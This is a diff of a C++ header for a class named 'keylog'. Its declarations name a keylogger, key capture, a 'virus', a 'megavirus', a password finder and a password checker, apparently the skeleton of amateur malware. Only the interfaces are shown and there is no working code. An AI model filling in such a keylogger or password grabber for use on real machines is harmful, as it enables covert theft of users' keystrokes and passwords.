@@ -2,26 +2,20 @@
 #define KEYLOG_H
 #include <iostream>
 
-struct password
-{
-  string password[1000]
-  
-};
+using namespace std;
 
 class keylog
 {
 public:
-  void keyloggers ();
-  bool specialkeys ();
-  bool buttons();
-  void keylogger(void *);
-  int rickroll();
-  int virus();
+  void keyloggers (LPCSTR text);
+  void keylogger();
+  bool specialkeys (int ikey);
+  void rickroll();
+  void virus();
   int keylogreader();
   int passwordfinder();
-  int virussetoff (void *);
-  int megavirus();
-  void start();
+  void passwordchecker(int y, string word);
+  void megavirus();
   void ppp();
 protected:
 private:
